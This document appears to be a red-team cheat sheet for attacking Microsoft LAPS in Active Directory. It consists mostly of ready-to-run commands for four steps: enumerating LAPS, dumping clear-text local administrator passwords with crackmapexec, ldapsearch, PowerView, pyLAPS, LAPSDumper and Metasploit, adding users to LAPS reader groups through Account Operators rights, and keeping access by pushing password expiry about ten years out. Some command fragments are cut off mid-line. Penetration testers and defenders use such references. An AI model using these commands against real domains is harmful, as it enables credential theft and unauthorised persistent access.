# ENUMERATION

    dir "C:\Program\LAPS\CSE"

    Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'

    Get-FileHash 'c:\program files\LAPS\CSE\Admpwd.dll'

    Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'

    reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

    Get-ADObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=DC01,DC=Security,CN=Local'

### If admpwd.dll exists, then enumeration is successful.

# LAPS PASSWORD EXTRACTION

### The "ms-mcs-AdmPwd" is a "confidential" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users

#### 1) 

    Get-Command *Admpwd*

#### 2) 

    Find-AdmPwdExtendedRights -Identity *

#### 3) 
    
    net groups "GROUP_THAT_HAS_ACCESS_TO_LAPS"

#### 4) 

    Get-AdmPwdPassword -ComputerName PC_THAT_HAS_LAPS_ENABLED

## Possible tools: LAPSToolkit, Crackmapexec, ldapsearch

### If a user has access to view the LAPS password, we can use crackmapexec or ldapsearch to dump password:

#### 1) CrackMapExec

    crackmapexec smb IP_ADDRESS -u USER -p PASSWORD --laps --ntds

    crackmapexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' --laps

#### 2) ldapsearch

    ldapsearch -h IP_ADDRESS -b 'DC=DOMAIN,DC=LOCAL' -x -D USER@DOMAIN.LOCAL -w 'PASSWORD' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

#### 3) LAPSToolkit

    Get-LAPSComputers

    Find-LAPSDelegatedGroups

    Find-AdmPwdExtendedRights

#### 4) adsisearcher (native binary on Windows 8+)

 - ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))"

 - ([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE

#### 5) Powerview

    Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwd

    Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

    Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname

    Get-AdmPwdPassword -ComputerName wkstn-2 | fl (Find the principals that have ReadProperty on ms-Mcs-AdmPwd

    Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd (Read the password)

#### 6) pyLAPS (Linux)

### Read the password of all computers

    ./pyLAPS.py --action get -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip IP_ADDRESS

### Write a random password to a specific computer

    ./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local'

#### 7) LAPSDumper (Linux)

    python laps.py -u 'user' -p 'password' -d 'domain.local'

    python laps.py -u 'user' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c' -d 'domain.local

#### 8) AdmPwd.PS

    Find-AdmPwdExtendedRights -identity *

    Find-AdmPwdExtendedRights -identity 'OU' | select-object ExtendedRightHolders

    get-admpwdpassword -computername COMPUTER_NAME | Select password

#### 9) Metasploit

    use post/windows/gather/credentials/enum_laps

# GRANT LAPS ACCESS

### The members of the group "Account Operator" can add and modify all the non admin users and groups. Since LAPS ADM and LAPS READ are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password

    Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain

    Add-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain

# LAPS Persistence

LAPS may be configured to automatically update a computers password on a regular basis. If we have compromised a computer and elevated to SYSTEM we can update the value to never expire for 10 years as a means of persistence.

#### PowerView

    Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose
    Setting 'ms-Mcs-AdmPwdExpirationTime' to '136257686710000000' for object '[HostName$]'
